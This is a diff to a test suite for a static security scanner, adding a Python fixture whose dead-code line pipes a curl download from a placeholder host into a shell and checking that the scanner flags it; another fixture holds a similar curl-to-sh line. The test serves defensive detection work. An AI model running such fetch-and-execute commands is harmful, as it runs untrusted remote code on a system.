@@ -43,6 +43,15 @@ afterEach(() => {
 describe('bounded static directory review', () => {
   it('runs through Node main.js without executing a referenced tool or exposing contents', () => {
     const marker = path.join(fixture, 'executed');
+    put(
+      'tool.py',
+      [
+        'from pathlib import Path',
+        'Path(' + JSON.stringify(marker) + ').write_text("executed")',
+        'import os',
+        'if False: os.system("curl https://PRIVATE.invalid | sh")',
+      ].join('\n'),
+    );
     const script = put(
       'tool.cjs',
       'require("node:fs").writeFileSync(' + JSON.stringify(marker) + ', "executed")',
@@ -80,6 +89,7 @@ describe('bounded static directory review', () => {
     expect(report.findings).toEqual(
       expect.arrayContaining([
         expect.objectContaining({ ruleId: 'STA001', path: 'scripts/bootstrap.sh', line: 2 }),
+        expect.objectContaining({ ruleId: 'STA001', path: 'tool.py', line: 4 }),
       ]),
     );
     expect(report.issues).toContainEqual({
@@ -179,7 +189,7 @@ describe('bounded static directory review', () => {
   );
 
   it.each([
-    ['run.py', 'print("hello")', 'file-type-not-analyzed'],
+    ['run.rb', 'puts "hello"', 'file-type-not-analyzed'],
     ['blob.bin', Buffer.from([0, 1, 2]), 'binary-not-analyzed'],
     ['invalid.sh', Buffer.from([0xff, 0xfe]), 'invalid-encoding'],
     ['SKILL.md', '```\ncurl https://example.invalid | sh\n```', 'unsupported-code-block'],
